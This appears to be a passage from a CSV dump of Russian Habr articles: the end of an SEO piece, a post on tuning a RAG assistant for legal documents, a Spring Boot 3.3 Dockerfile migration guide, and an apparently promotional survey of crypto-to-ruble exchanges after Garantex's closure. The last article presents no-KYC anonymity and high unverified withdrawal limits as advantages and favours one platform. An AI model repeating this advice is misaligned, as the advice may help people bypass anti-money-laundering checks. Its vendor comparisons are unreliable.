можно утверждать, что Google и Яндекс говорят правду, но не всю.Инженеры видят идеальную систему, но на практике приходится идти на компромиссы. SEO-специалисты часто правы в тактике, но ошибаются в долгосрочных трендах. Реальный поиск — это смесь алгоритмов, ручных правок и рыночных законов.А главный вывод такой: SEO — это не просто следование правилам, а постоянная адаптация. Лучшая стратегия — делать качественный контент, но при этом тестировать гипотезы и следить за изменениями алгоритмов.На этом всё. Если у вас есть вопросы — буду рад ответить. А вообще делитесь своим мнением и своими наблюдениями: какие закономерности в работе поисковиков вы замечаете? Чья версия правды вам ближе?Что еще почитатьКак «Наруто», «Тетрадь смерти», «Атака титанов» и другие аниме учат нас грамотно управлять аутстафф-проектамиЧто я понял о жителях России, пока изучал гватемальцев. Опыт UX-исследования с другой стороны планетыДизайнера обидеть может каждый: 4 правила из художки, которыми я пользуюсь в работе"
10,RAG: борьба с низким качеством ответов в условия экономии памяти на GPU,Первая грузовая компания (ПГК),Крупнейшая цифровая логистическая компания на ж/д,0,"Веб-разработка, Мобильные технологии, Веб-сервисы",2025-04-10,"Привет, Хабр! Меня зовут Саприн Семён. Я занимаюсь анализом данных и машинным обучением в компании ПГК Диджитал. Сегодня мы начинаем серию статей, в которой я расскажу о том, как мы с командой разрабатывали ИИ-помощника, а также приведу практические кейсы по улучшению точности ответов с минимальными затратами памяти графических процессоров. Как вы уже могли догадаться, наш ИИ-помощник разработан на основе RAG (Retrieval-Augmented Generation) системы. Хотя принцип работы RAG многим уже знаком и не вызывает того самого «вау», я всё же кратко напомню, как эта система работает, почему она так популярна и почему её ответам можно доверять.В этой статье я расскажу, как мы разрабатывали RAG-систему для юридического отдела нашей компании, с какими вызовами столкнулись и как их преодолевали. Вы узнаете, почему стандартные подходы не всегда работают, и как, погрузившись в специфику данных, мы смогли значительно улучшить качество ответов, сохранив при этом экономию ресурсов GPU.https://www.freepik.com/pikaso/reimagine?prompt=&style=noStyle&submit=1&sign-up=googleПреимущества ИИ-помощника на основе RAGНачнём понемногу погружаться в тему и первым делом проговорим про преимущества ИИ-помощника по сравнению с другими онлайн системами по типу ChatGPT, DeepSeek, Claude и тд. ИИ-помощник на основе RAG - это не что иное, как вопросно–ответная система или, другими словами, чат-бот, который должен генерировать ответы на вопросы пользователя. Эта система работает in-house, то есть никакие данные, которые вы ему подаёте, не утекают в бесконечные просторы всемирной паутины. Это очень важный фактор, ведь если вы любитель облегчить свою работу, задавая вопросы какому-нибудь ChatGPT, прикрепляя ему рабочие документы (или даже несколько страниц этих документов), то будьте уверены, что товарищи «безопасники» вас не похвалят и уж точно не погладят по голове за то, что через час у вас произойдёт утечка корпоративных данных. Но почему именно RAG? Теперь мы можем ответить этот вопрос:конфиденциальность: система работает in-house, что исключает утечку данных;гибкость: она может быть адаптирована под любую предметную область, будь то юриспруденция, медицина или финансы;доверие: ответы системы основаны на реальных документах, что делает их достоверными и обоснованными.Принцип работы RAGПерейдём к принципу работы RAG. В сети уже крайне много описаний работы этой системы, не хочу повторяться, поэтому кратко:RAG состоит из двух основных инструментов:Retriever (поисковик) - часть, которая отвечает за нахождение релевантных документов, вернее их отрывков, которые называются чанками. Generator (генератор 😊) – часть, которая отвечает за генерацию ответа на основе чанков, найденных ретривером. В качестве генератора и ретривера мы используем open-source инструменты Open-Source они как раз для того, чтобы всё было in-house.Первый заказчик: юридический отдел ПГКПервым внутренним заказчиком ИИ-помощника стал юридический отдел Первой грузовой компании (ПГК), материнской компании ПГК Диджитал. Это решение было инициативой самого отдела, так как юристы ежедневно сталкиваются с огромным объёмом сложных документов, требующих высокой точности и внимания к деталям. Эффекты от внедрения ИИ-помощника:снижение нагрузки на экспертов и высвобождение времени на другие важные задачи;ускорение адаптации новых сотрудников и вовлечения их в рабочие процессы;снижение порога экспертности нанимаемых сотрудников.Чтобы у читателя не возникло недопонимания, важно четко обозначить позицию: ИИ-помощник создан для того, чтобы помогать сотрудникам экономить время, автоматизируя рутинные задачи, такие как поиск необходимых данных и извлечение информации из документов. Его цель — упростить и ускорить рабочие процессы, освобождая время для более важных и творческих задач.Baseline и вводныеBaseline (Semantic Search): В качестве базового подхода мы взяли простой семантический поиск. В качестве модели для создания эмбеддингов использовали эмбеддер от ВК: deepvk/USER-bge-m3.К счастью, наши коллеги помогли сформировать выборку для оценки качества получившегося функционала. В нашем распоряжении оказалась тестовая выборка содержащая:~100 вопросов (мало, но зато не синтетика)Ответы на эти вопросы, сформированные экспертамиКуски текста, в которых содержится информация для ответа на вопросТакже хочется упомянуть, что в базовом решении мы использовали Recursive Chunking с параметрами разделения:chunk_size=1000 – длина чанка в символах chunk_overlap=200 – длина перекрытия чанковseparators=[""\n\n"", ""\n"", ""."", "";"", "","", "" ""]. Эти разделители были выбраны как стандартные маркеры, которые обычно указывают на завершение мысли или логического блока текста.Думаю, читателю понятно, что при нахождении «идеальных» чанков, даже относительно слабая LLM легко выдаст правильный ответ (если её не начнёт уносить на родной язык), а без них – какую бы модель вы ни взяли, она не сможет ответить на вопрос, ответ на который содержится в закрытых корпоративных документах (по крайней мере мы на это надеемся 😊). И, если вы не забыли, мы находимся в условиях экономии памяти GPU. Исходя из этого, в качестве модели генератора мы использовали gemma-2-9b-it-sppo-iter3, которая довольно хорошо справляется с текстами на русском языке, но при этом не требует большой нагрузки на GPU. Размер контекстного окна в этой модели – 2048 токенов. Размер контекстного окна – это максимальная длина последовательности, которую языковая модель способна обработать за один проход.  Другими словами, представьте, что ваша школьная жизнь — это как контекстное окно языковой модели. Самые яркие и запоминающиеся истории — это последние годы учёбы: последний звонок, выпускной. А вот что было в начальных классах? Кто-то помнит, как учился писать буквы или как впервые получил двойку? Вряд ли. Эти воспоминания, как и начало длинного текста, просто стираются из памяти, потому что ""окно"" внимания ограничено. В выбранной нами модели размер контекстного окна – 2048 токенов, что эквивалентно примерно одной странице текста в формате word, написанного 12-м шрифтом.  Может показаться, что это довольно простая задача – найти из 100 страничного документа 1 страницу, на которой будет содержаться ответ на вопрос, ведь размер контекстного окна в 2048 токенов нельзя назвать маленьким, но оказывается, что и этого может быть недостаточно.Думаю, что можно переходить к экспериментам с ретривером, ведь как мы поняли, качество ответов зависит, по большому счету, от него. Наши эксперименты начались с общеизвестных техник.Пробуем разные подходы RAGГибридный поиск  (Semantic Search + BM25)Первым делом мы решили попробовать гибридный подход, сочетающий семантический поиск (по смыслу) и лексический (по ключевым словам). Это дало некоторый прирост в точности, релевантность найденных чанков увеличивалась, и система начинала отвечать на большее количество вопросов, но все равно оставались проблемные моменты. Хочется сделать один из промежуточных выводов: ставить RAG на систему с юридическими текстами может оказаться не самой простой задачей, ведь такие тексты являются очень сложными для восприятия даже живым человеком, и настроить поиск, который будет отрабатывать с минимальными потерями информации, не всегда удаётся. Модель кросс-энкодера для ранжирования найденных чанков по релевантностиТакже не будем забывать о проблеме Lost-In-The-Middle, которой подвержены большие языковые модели. Она заключается в следующем: при подаче на вход LLM больших контекстов, модель фокусируется на начале и конце входного текста, при этом «забывая» середину. То есть наша задача – отранжировать найденные чанки по релевантности. Другими словами, мы хотим добиться того, чтобы куски текста, в которых содержится бо́льшая часть ответа, модель видела как можно раньше. Для этого используем кросс-энкодер, в нашем случае PitKoro/cross-encoder-ru-msmarco-passage, в надежде на то, что он сможет лучше понять значимость контекста, нежели привычная косинусная мера от би-энкодера.  Саммари документовВ процессе работы мы столкнулись с тем, что не все стандартные подходы и методы, которые хорошо работают в других областях, оказываются неэффективными в нашем случае. Одним из таких примеров стало использование саммари чанков. Идея подхода:Генерируем саммари по каждому чанку с помощью LLM;По входящему запросу пользователя осуществляем поиск по всем саммари;Для топ-5 найденных саммари возвращаем их начальные чанки для генерации ответа.В теории, саммари должны обобщать содержание текста, выделяя ключевые моменты и упрощая поиск релевантной информации. Однако в контексте юридических документов мы обнаружили, что саммари зачастую становятся ещё более унифицированными и похожими друг на друга, чем исходные чанки. Это связано с тем, что юридические документы и так содержат много повторяющихся формулировок и стандартных конструкций. В результате, внедрение саммари не только не улучшило качество поиска релевантных чанков, но в некоторых случаях даже ухудшило его, так как саммари теряли важные детали и нюансы, характерные для конкретных документов. Аннотация чанковЕщё одним экспериментом, который не оправдал наших ожиданий, стало использование аннотаций, сгенерированных с помощью LLM.Идея подхода:для каждого чанка создаём аннотации в виде 5-10 ключевых слов;модифицируем исходные чанки, добавляя перед каждым его аннотацию;для топ-5 найденных модифицированных чанков возвращаем исходные для генерации ответа.Мы предполагали, что аннотации, состоящие из ключевых слов, в отличие от саммари, которые «размывают» исходные чанки, смогут улучшить качество поиска как для классических методов (BM25), так и для современных подходов, таких как би-энкодеры. Однако на практике аннотации, созданные LLM, оказались не всегда полезными. Они часто содержали ненужную или нерелевантную информацию, что не улучшало точность поиска и не приносило значительного улучшения точности поиска.Также стоит упомянуть, что создание саммари или аннотации требует дополнительных вычислительных ресурсов GPU. А формула у нас простая: если мы и тратим GPU, то тратим его на улучшение качества функционала, а не для того, чтобы время работы системы увеличилось без существенного улучшения ответов.Осознание проблемыМы пробовали множество классических (и не очень) подходов, которые я не буду здесь затрагивать, все они сильно нагружали систему из-за «бесконечного» обращения к LLM за помощью в разных задачах, но по итогу не приводили к реальным улучшениям. Тогда мы решили отойти от классических подходов и более детально погрузиться в исходные документы, их структуру и содержание.Предложенные решенияРешение 1:Изучив имеющиеся документы, возникла одна идея: создание аннотации для каждого чанка, но не те аннотаций, который мы уже пробовали генерировать с помощью LLM, а создавать их вручную, опираясь на структуру юридических документов, ведь в таких текстах всегда присутствует оглавление, которое можно использовать для создания аннотаций. Мы обработали оглавление (текст в начале документа в котором указано, на какой странице содержится какая глава и параграф) и использовали его в качестве аннотаций для чанков.Глава: «2. Ответственность сторон»Параграф: «2.3. Условия одностороннего расторжения договора»Текст: «В случае одностороннего расторжения договора, инициатор расторжения обязан уведомить другую сторону в письменной форме не менее чем за 30 календарных дней до предполагаемой даты расторжения. Уведомление должно содержать причины расторжения и ссылки на соответствующие пункты настоящего договора. …»Например, если чанк находился в главе ""2. Ответственность сторон"" и параграфе ""2. 3. Условия одностороннего расторжения договора"", то в качестве аннотации к этому чанку мы добавляли именно эти названия. И модифицированный чанк становился следующим:Решение 2:Кроме того, мы обратили внимание на важность правильного разделения текста на чанки. Юридические документы имеют чёткую структуру, и важно, чтобы чанки не пересекались между главами или параграфами. Мы начали с того, что разделили тексты на главы, затем на параграфы, и только внутри каждого параграфа выделяли чанки. К каждому чанку добавляли название главы и параграфа в качестве аннотации. Это позволило сохранить контекст, дало системе лучшее понимание каждого чанка и существенно улучшило качество поиска.Этот подход оказался гораздо более эффективным, как с точки зрения вычислений так и с точки зрения качества ответов.Решение 3:И последним неочевидным действием в борьбе за высоким качеством ответов стало самое простое – изменение разделителей для сплиттера (той части, которая разбивает текст на чанки).  Изначально мы задали следующие параметры для сплиттера: chunk_size=1000chunk_overlap=200, separators=[""\n\n"", ""\n"", ""."", "" "", """"]. После проведения ряда экспериментов с разной длиной разбиения мы пришли к выводам:лучшие ответы получаются при chunk_size=1500, chunk_overlap=400;символ «.» нельзя использовать в качестве разделителя в нашем случае, ведь он приводит к ухудшениям связности контекстапример:«Глава 1. Общие положения  1.1. Стороны договора обязаны соблюдать условия, указанные в настоящем документе.  1.2. В случае нарушения условий, сторона-нарушитель обязана возместить убытки в соответствии со ст. 15 ГК РФ.».Если у нас в разделителях находится «.», мы можем получить следующие чанки:• Глава 1. Общие положения 1.1.• стороны договора обязаны соблюдать условия, указанные в настоящем документе.  1.2.• в случае нарушения условий, сторона-нарушитель обязана возместить убытки в соответствии со ст. 15 ГК РФ.Это может стать проблемой в том случае, если вы хотите, чтобы модель при генерации финального ответа, указывала название и номер пункта, из которого он был получен (что является хорошей практикой, ведь пользователь всегда может провалидировать ответ системы, открыв указанные в ответе пункты документа – тем самым повышается доверие к системе).Также мы убрали пробел из разделителей, что привело к тому, что чанки не разрываются на середине предложения, теряя важную информацию. Конечно, данный подход увеличивает их средний размер, но при этом сохраняет контекст, что необходимо в случае работы с юридическими документам, где важно сохранить начальную структуру.Заключение и основные выводыРазработка RAG-системы для юридических документов оказалась сложной, но интересной задачей. В процессе мы провели множество экспериментов, пробуя различные подходы, и пришли к нескольким ключевым выводам. Во-первых, аннотации на основе оглавления показали себя гораздо эффективнее, чем автоматически сгенерированные саммари или ключевые слова. Они позволили сохранить контекст и значительно улучшить качество поиска. Во-вторых, правильное разделение текста на чанки с учётом структуры документа (главы, параграфы, пункты) стало критически важным для сохранения смысловой целостности.Несмотря на то, что многие классические подходы не оправдали ожиданий, этот опыт подтвердил, что адаптация под специфику данных является ключом к успеху. Мы продолжаем улучшать нашу систему, и в следующей статье я расскажу, как мы дообучали модель эмбеддингов для ещё более точного поиска, а также приведу метрики, которые мы использовали для оценки качества работы нашей системы. Оставайтесь с нами!"
11,Spring Boot 3.3 и Docker: изменение в эффективных docker-образах,Spring АйО,Компания,0,Программное обеспечение,2025-04-10,"Переход от Spring Boot 3.2 к 3.3 принес изменения в процесс распаковки JAR и запуск приложения в Docker-контейнере.В новой статье от Рустама Курамшина, эксперта сообщества Spring АйО, вы узнаете: • что именно изменилось • как это отразится на создании Dockerfile • и как адаптировать проекты к новым условиям.ВведениеПри разработке приложений на Spring Boot создание docker-образов — частая задача, особенно в современных CI/CD-пайплайнах. Оптимизация сборки этих образов играет ключевую роль, так как позволяет сократить время последующих билдов, эффективно используя кэширование слоев docker-образа. Spring Boot помогает в этом, предоставляя возможность распаковки JAR-архива на отдельные слои: dependencies, spring-boot-loader, snapshot-dependencies и application. Такой подход позволяет перестраивать только измененные части и, например, оставлять зависимости в кэше демона docker.С переходом от версии Spring Boot 3.2 к 3.3 изменился процесс распаковки JAR и запуска приложения внутри Docker-контейнера. В этой статье мы разберем, что именно поменялось, как это влияет на написание Dockerfile, и как адаптировать свои проекты.Как это работало в Spring Boot 3.2В Spring Boot 3.2 для распаковки JAR-файла использовался режим jarmode=layertools. Команда выглядела так:java -Djarmode=layertools -jar application.jar extract Эта команда распаковывала JAR-архив на четыре каталога:dependencies — внешние зависимости;spring-boot-loader — загрузчик Spring Boot;snapshot-dependencies — зависимости snapshot-версий;application — код приложения.После распаковки эти каталоги копировались на отдельные слои в итоговый docker-образ, а приложение запускалось с помощью класса JarLauncher. Такой подход обеспечивал разделение слоев для эффективного кэширования, но требовал явного указания загрузчика в ENTRYPOINT в Dockerfile.Пример Dockerfile для Spring Boot 3.2:FROM eclipse-temurin:17-jre as builder WORKDIR application ARG JAR_FILE=target/*.jar COPY ${JAR_FILE} application.jar RUN java -Djarmode=layertools -jar application.jar extract  FROM eclipse-temurin:17-jre WORKDIR application COPY --from=builder application/dependencies/ ./ COPY --from=builder application/spring-boot-loader/ ./ COPY --from=builder application/snapshot-dependencies/ ./ COPY --from=builder application/application/ ./ ENTRYPOINT [""java"", ""org.springframework.boot.loader.launch.JarLauncher""] Процесс прост: JAR-архив распаковывается в рабочей директории, каталоги копируются в итоговый образ, а запуск осуществляется через JarLauncher.Что изменилось в Spring Boot 3.3В Spring Boot 3.3 подход к распаковке и запуску был обновлен. Основные изменения:Смена jarmode: Вместо jarmode=layertools теперь используется jarmode=tools.Обновленная команда распаковки: Команда extract теперь требует дополнительных опций, таких как --layers и --destination, чтобы явно указать директорию для распаковки. Пример:java -Djarmode=tools -jar my-app.jar extract --layers --destination extracted Это дает больше контроля над тем, куда распаковываются слои, в отличие от версии 3.2, где распаковка происходила в текущую директорию по умолчанию.Новый способ запуска: Вместо JarLauncher приложение теперь запускается стандартной командой java -jar application.jar. Однако важно понимать, что application.jar в этом случае — это не исходный ""uber JAR"", а специальный JAR-файл, содержащий только код приложения и ссылки на распакованные зависимости.Пример Dockerfile для Spring Boot 3.3:FROM bellsoft/liberica-openjre-debian:17-cds AS builder WORKDIR /builder ARG JAR_FILE=target/*.jar COPY ${JAR_FILE} application.jar RUN java -Djarmode=tools -jar application.jar extract --layers --destination extracted  FROM bellsoft/liberica-openjre-debian:17-cds WORKDIR /application COPY --from=builder /builder/extracted/dependencies/ ./ COPY --from=builder /builder/extracted/spring-boot-loader/ ./ COPY --from=builder /builder/extracted/snapshot-dependencies/ ./ COPY --from=builder /builder/extracted/application/ ./  ENTRYPOINT [""java"", ""-jar"", ""application.jar""] Обратите внимание на различия:Использование jarmode=tools вместо layertools.Явное указание директории распаковки через --destination extracted.Переход на java -jar application.jar в ENTRYPOINT.Причины перехода на новый способ запуска распакованных JAR-файловЭти изменения делают процесс запуска приложения более стандартизированным. Команда java -jar — это привычный способ запуска Java-приложений, что упрощает интеграцию с другими инструментами и делает Dockerfile более интуитивным.Еще одно новшество в Spring Boot 3.3 — поддержка Class Data Sharing (CDS). Это опциональная возможность, которая может ускорить запуск приложения за счет оптимизации загрузки классов, но для целей этой статьи она не является ключевой. Новый подход позволяет писать CDS-friendly Dockerfile потому что при переходе на использование CDS вам нужно будет интегрировать в Dockerfile тренировочные запуски приложения (""training run"") для получения jsa-архива с классами:RUN java -XX:ArchiveClassesAtExit=application.jsa -Dspring.context.exit=onRefresh -jar application.jar РезюмируемЕсли вы обновляете проект с Spring Boot 3.2 до 3.3, вот план адаптации Dockerfile:Обновите jarmode: Замените jarmode=layertools на jarmode=tools.Добавьте опции в команду распаковки:ИзменитеRUN java -Djarmode=tools -jar application.jar extractнаRUN java -Djarmode=tools -jar application.jar extract --layers --destination extracted.Измените точку входа:ЗаменитеENTRYPOINT [""java"", ""org.springframework.boot.loader.JarLauncher""]наENTRYPOINT [""java"", ""-jar"", ""application.jar""].Обновите пути копирования: Убедитесь, что пути в COPY соответствуют новой директории распаковки (например, /builder/extracted/ вместо application/).ЗаключениеПереход на Spring Boot 3.3 привносит изменения в процесс распаковки JAR и запуска приложений в Docker-контейнерах, делая его более гибким и приближенным к стандартным практикам Java. Обновление Dockerfile при миграции на новую версию не требует значительных усилий, но важно учесть новые параметры jarmode и команду запуска.Для ознакомления с хорошими практиками написания Dockerfiles для Spring Boot предлагаю вам ознакомиться с моим докладом на JPoint 2024 - ""Правильный DevOps для Spring Boot и Java"":Смотреть на YouTubeСмотреть на VK Видео Присоединяйтесь к русскоязычному сообществу разработчиков на Spring Boot в телеграм — Spring АйО, чтобы быть в курсе последних новостей из мира разработки на Spring Boot и всего, что с ним связано. "
12,Криптовалюта в России: Куда бежать выводить рубли после закрытия Garantex?,BotHub,"Агрегатор нейросетей: ChatGPT, Claude, Midjourney",0,"Веб-разработка, Программное обеспечение, Веб-сервисы",2025-04-10,"Привет, Хабр! Сегодня я хочу поговорить с вами о ситуации, которая заставила многих российских криптоэнтузиастов изрядно понервничать. Помните Garantex? Биржа внезапно исчезла с радаров, оставив сотни тысяч пользователей в поисках надежной альтернативы для вывода криптовалюты в рубли. Давайте разберемся, что произошло, и главное — куда теперь двигаться дальше.Приятного прочтения!Ситуация с Garantex и ее последствия для российского криптовалютного рынкаМарт 2025 года, обычный день, и вдруг… Garantex, одна из крупнейших российских криптобирж, прекращает работу после масштабной операции международных правоохранительных органов. *Честно говоря, тучи над биржей сгущались давно, но да ладно.Всё началось 6 марта, когда Tether заблокировал кошельки Garantex на сумму — около 2,5 млрд рублей (примерно $28 млн). Причина? Включение биржи в 16-й пакет санкций ЕС против России. Европейский Союз прямо заявил, что Garantex тесно связана с подсанкционными российскими банками и помогает обходить ограничения.Официальный пост в TelegramСитуация стремительно ухудшилась, когда Секретная служба США вместе с Европолом и правоохранительными органами нескольких европейских стран изъяли домены биржи. Вместо привычного интерфейса пользователи увидели классическое уведомление о конфискации.А дальше — еще интереснее. Минюст США выдвинул серьезные обвинения: с 2019 года Garantex якобы обработала транзакции на сумму более $96 млрд, значительная часть которых была связана с отмыванием денег и финансированием преступной деятельности. Двум администраторам биржи предъявили обвинения в сговоре с целью отмывания денег, а одному из них — еще и в нарушении санкций.После всего этого Garantex предприняла, на мой взгляд, довольно странный шаг — пригласила клиентов на личные встречи в московский офис. Будто не самая стандартная практика для криптобизнеса, где анонимность ценится на вес золота.Но проблемы Garantex начались не вчера. Еще в апреле 2022 года биржа попала под санкции OFAC США за содействие транзакциям, связанным с даркнет-рынками и группами вымогателей. По данным TRM Labs, после включения в санкционный список Garantex обработала транзакции на более чем $100 млрд, что составляет более 70% всего объема транзакций с подсанкционными организациями за этот период.Учитывая кейс Garantex — при выборе платформы для работы с криптовалютой, важно смотреть не только на комиссии и удобство интерфейса, но и на репутацию, прозрачность и соблюдение международных стандартов.P2P-обменДавайте поговорим о P2P-обмене — модели, которая стала особенно популярной в России после закрытия централизованных платформ. Что такое P2P? Маловероятно, что вы, будучи заинтересованными лицами в криптовалюте не знаете, но я лучше скажу, чем не скажу: при P2P-обмене вы напрямую обмениваетесь криптовалютой с другими пользователями, без посредников. И будто бы это звучит очень хорошо, но, как и везде, здесь есть свои плюсы и минусы.P2P-обмен предлагает немало преимуществ. Во-первых, прямое взаимодействие между покупателями и продавцами устраняет необходимость в посредниках, что потенциально снижает комиссионные издержки. Во-вторых, вы получаете гибкость ценообразования — возможность договориться о курсе напрямую часто дает более выгодные условия. Также привлекает разнообразие платежных методов — от банковских переводов до электронных кошельков и даже наличных. Для многих пользователей в регионах с ограничениями P2P становится единственным способом конвертации криптовалюты.Однако не всё так радужно. Существуют серьезные риски, о которых я знаю не понаслышке. Особенно опасны мошеннические схемы, такие как ""треугольники"", когда оплата приходит со счета третьего лица. Также актуальна проблема ""грязных"" денег — вы не знаете, откуда пришли средства, и можете невольно стать соучастником отмывания. Многие P2P-площадки проводят минимальные проверки участников или вообще их не делают, а в случае проблем биржи часто снимают с себя ответственность, оставляя вас один на один с мошенниками.Знаю кейс, когда пользователь получил оплату за проданную криптовалюту, а через неделю его банковский счет заблокировали — оказалось, деньги пришли от человека, замешанного в финансовых махинациях. Разблокировка счета заняла почти два месяца, бывает и такое.MatbeaСреди российских решений для P2P-обмена стоит отметить Matbea — платформе, которая, на мой взгляд, заслуживает особого внимания, особенно в контексте безопасности P2P-операций и блокировки Garantex. Matbea представляет собой многофункциональный цифровой кошелек, запущенный в 2014 году. За более чем десятилетнюю историю платформа эволюционировала из простого обменника в комплексное решение для работы с цифровыми активами, уделяя особое внимание безопасности и соответствию регуляторным требованиям.К февралю 2022 года, благодаря расширению функционала и внедрению новых возможностей, кошелек стал популярным инструментом для работы с цифровыми активами среди российских пользователей.Но Matbea здесь не просто так: рассмотрим подход к безопасности. Во-первых, трехфакторная аутентификация (3FA) с использованием пароля, Google Authenticator и ПИН-кода. Во-вторых, строгая верификация всех участников — не только базовая KYC, но и дополнительные проверки для мерчантов. И в-третьих, скоринг криптовалюты с анализом цепочки транзакций для выявления ""грязных"" средств.Последний пункт особенно важен. Представьте: вы получаете криптовалюту, не зная, что она связана с даркнетом или хакерскими атаками. Потом пытаетесь вывести ее на регулируемой бирже — и вот ваш аккаунт заблокирован, а вы получаете письмо с требованием объяснить происхождение средств. Очевидно, что ситуация неприятная.Matbea активно борется с ""треугольниками"" и другими мошенническими схемами, обеспечивая прозрачность операций. Все транзакции происходят напрямую между верифицированными пользователями, что значительно снижает риск блокировки банковских карт и счетов.Долгое присутствие Matbea на рынке способствовало формированию устойчивой базы пользователей, а это обеспечивает хорошую ликвидность для P2P-обмена. Так же стоит отметить большое количество продавцов, что создает конкурентную среду и приводит к формированию выгодных цен на USDT и другие криптовалюты.Китайские криптобиржи и P2PGate.ioПерейдем к Gate.io, которая работает с 2013 года и имеет впечатляющий ежедневный объем торгов — около $1,48 млрд. Биржа зарегистрирована на Каймановых островах, хотя изначально была создана в Китае.Платформа предлагает целую экосистему для работы с криптовалютой: спотовая и маржинальная торговля, облачный майнинг, фарминг и, конечно, P2P-обмен. Многие отмечают в Gate.io систему подтверждения резервов через дерево Меркла — где вы сами можете проверить наличие средств на платформе. Согласитесь, это важно на фоне участившихся случаев банкротства криптобирж из-за недостаточности резервов.P2P-площадка Gate.io поддерживает операции с рублями, что делает ее потенциально привлекательной для российских пользователей. Однако комиссии на бирже выше среднерыночных — 0,2% против стандартных 0,1% на большинстве конкурирующих платформ.В контексте безопасности P2P-сделок Gate.io предлагает стандартный эскроу-сервис, блокирующий криптовалюту продавца до подтверждения оплаты покупателем. При этом верификация участников P2P-сделок остается ограниченной, а проверка происхождения средств практически отсутствует. И это создает серьезные риски для пользователей, которые могут получить средства от третьих лиц или из сомнительных источников.BybitА далее – Bybit – запущена в 2018 году и зарегистрирована на Британских Виргинских островах. За короткое время стала одним из лидеров криптовалютного рынка. Ежедневный объем торгов Биткоином на платформе превышает $8,3 млрд, что делает ее одной из самых ликвидных бирж в мире.P2P-платформа Bybit привлекает пользователей низкими комиссиями — 0,1% для спотовой торговли, что соответствует среднерыночному уровню. Для активных трейдеров доступно кредитное плечо до 100х на фьючерсах, хотя эта функция не связана напрямую с P2P-сегментом.Важным преимуществом Bybit является наличие лицензий от регуляторов Кипра, что повышает уровень доверия к платформе. Биржа также обеспечивает подтверждение резервов в соотношении 1:1, гарантируя наличие средств для покрытия всех пользовательских депозитов.Безопасность P2P-сделок на Bybit обеспечивается двухфакторной аутентификацией и антифишинговыми кодами. Однако контроль за происхождением средств в P2P-сделках остается ограниченным. Пользователи сообщают о случаях поступления средств от третьих лиц, а это риски блокировки банковских счетов и потенциальные юридические проблемы.P2P-раздел Bybit поддерживает операции с рублями, предлагая различные способы оплаты, включая банковские переводы и российские платежные системы. MEXCДалее на очереди (но не по значимости) – MEXC, основанная в 2018 году командой специалистов с опытом работы в финансовых компаниях, кстати, быстро набирает популярность в России. Биржа выделяется на фоне конкурентов отсутствием комиссий на спотовом рынке — 0% как для мейкеров, так и для тейкеров, а это является существенным преимуществом для активных трейдеров.Необязательная верификация на MEXC позволяет пользователям сохранять относительную анонимность при работе с платформой. Без прохождения KYC доступен ежедневный лимит на вывод в размере 30 BTC, чего более чем достаточно для покрытия потребностей большинства пользователей. После базовой верификации лимит увеличивается до 80 BTC, а полная верификация открывает доступ к выводу до 200 BTC в сутки.P2P-платформа MEXC поддерживает операции с рублями и предлагает разнообразные способы оплаты, адаптированные под российский рынок. Однако прямые фиатные депозиты на бирже недоступны — пополнение счета в фиатной валюте возможно только через P2P или с использованием банковских карт.Безопасность P2P-сделок на MEXC обеспечивается базовыми настройками, включая двухфакторную аутентификацию и верификацию по email. При этом контроль за участниками P2P-сделок остается ограниченным, а проверка происхождения средств практически отсутствует, и снова риски для пользователей.HTX (бывший Huobi)Продолжим идти по востоку и рассмотрим HTX, ранее известную как Huobi. Была основана в 2013 году в Китае, но сейчас зарегистрирована на Сейшельских островах. С ежедневным объемом торгов около $2 миллиардов, биржа входит в число крупнейших криптовалютных платформ в мире.P2P-платформа HTX отличается поддержкой прямых пар с рублем (BTC/RUB, USDT/RUB), которая упрощает процесс конвертации для российских пользователей. Комиссия на спотовом рынке составляет 0,2% (снова выше среднерыночного уровня), но компенсируется широким выбором торговых пар и высокой ликвидностью.Верификация на HTX не является обязательной, с лимитом на вывод без KYC в размере 5 BTC в сутки. Доступны четыре уровня верификации, с увеличением лимитов на вывод до 3000 BTC для полностью верифицированных аккаунтов.Безопасность на HTX обеспечивается многоуровневой защитой аккаунта, включающей двухфакторную аутентификацию, SMS-верификацию, торговый пароль и антифишинговый код. Средства пользователей хранятся преимущественно на ""холодных"" кошельках, что снижает риск хакерских атак.HTX имеет шесть лицензий от различных регуляторов, включая Литву, Гибралтар, Дубай, Виргинские острова, Австралию и страны Южной Америки, платформу можно отнести к одной из наиболее регулируемых, что потенциально снижает риски для пользователей.Правда, несмотря на преимущества, проверка происхождения средств в P2P-сделках на HTX остается ограниченной, а это создает риски для пользователей, особенно в контексте российского регулирования и международных санкций.KuCoinИ, конечно, KuCoin, которая основана  в 2017 году и зарегистрирована на Сейшельских островах. Обслуживает более 30 миллионов пользователей в более чем 200 странах. Биржа предлагает комиссию 0,1% для спотовой торговли — среднерыночный уровень.P2P-платформа KuCoin поддерживает операции с различными фиатными валютами, включая евро, бразильский реал и британский фунт, но прямая поддержка рубля ограничена. Биржа предлагает более 700 активов и 1240 торговых пар, что обеспечивает широкие возможности для диверсификации портфеля.С июля 2023 года KuCoin ввела обязательную верификацию для новых пользователей в рамках усиления мер по борьбе с отмыванием денег. Существующие пользователи без верификации могут использовать ограниченный набор услуг, включая продажу криптовалют и закрытие контрактов.Безопасность на KuCoin обеспечивается антифишинговыми кодами для email, входа в систему и вывода средств, а также привязкой электронной почты и номера телефона. Биржа хранит средства клиентов на ""холодных"" кошельках, снижая риски хакерских атак.Несмотря на меры безопасности, контроль за P2P-операциями на KuCoin остается ограниченным, как и для многих рассмотренных ранее китайских бирж, а информация о наличии лицензий, регулирующих деятельность биржи в качестве поставщика услуг цифровых активов, отсутствует в открытом доступе.Кому доверить свои биткоины?Если сравнивать платформы по ключевым параметрам, то в плане верификации участников китайские биржи (Gate.io, Bybit, MEXC, HTX) предлагают ограниченную или необязательную верификацию для P2P-транзакций. KuCoin требует обязательной верификации для новых пользователей, но для P2P-операций проверка остается ограниченной. Matbea предлагает строгую верификацию всех участников, в том числе дополнительные проверки для мерчантов.Если говорить про проверку происхождения средств, то Gate.io, Bybit, MEXC, HTX и KuCoin осуществляют минимальный контроль или не делают этого вовсе. Matbea, напротив, проводит полноценный AML-скоринг криптовалюты с анализом цепочки транзакций.По уровню защиты от мошенничества Gate.io и MEXC предлагают базовые механизмы, Bybit, HTX и KuCoin — средний уровень защиты, а Matbea обеспечивает хороший уровень с комбинацией различных мер.В плане удобства вывода в рубли Gate.io, MEXC и KuCoin можно оценить как средний уровень, Bybit и HTX — как хороший, а Matbea предлагает хороший+ уровень удобства. В итогеДля активного трейдинга и инвестирования биржи вроде Bybit, MEXC или HTX предоставляют обширные возможности — много торговых пар, развитый функционал, высокая ликвидность. А для безопасного обмена USDT на рубли я бы обращал внимание на платформы 